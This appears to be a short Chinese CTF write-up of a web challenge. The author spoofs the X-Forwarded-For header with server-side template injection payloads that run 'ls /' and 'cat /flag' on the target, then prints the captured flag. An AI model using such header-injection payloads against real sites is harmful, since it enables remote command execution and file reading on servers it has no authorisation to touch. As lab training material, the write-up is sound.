---
title: "看看ip"
published: 2025-09-07
category: CTF
---

![](https://pic.npiter.de/file/1757210100958_0.png)

打开网站，点击 `Reveal My IP` 可以显示当前 IP，用 BurpSuite 抓包分析这个过程。

发现只是调用了一个 IP 查询 API，返回结果而已。

联想到 XFF 头伪造 + 模板注入，构造：

```
X-Forwarded-For: {{system('ls /')}}
```

![](https://pic.npiter.de/file/1757210096373_3.png)

网页返回：

![](https://pic.npiter.de/file/1757210098867_1.png)

发现有 flag 字样，于是构造：

```
X-Forwarded-For: {{system('cat /flag')}}
```

得到返回：

![](https://pic.npiter.de/file/1757210099224_2.png)

**`NSSCTF{220b62a8-5e58-4498-ba00-218dd328b303}`**
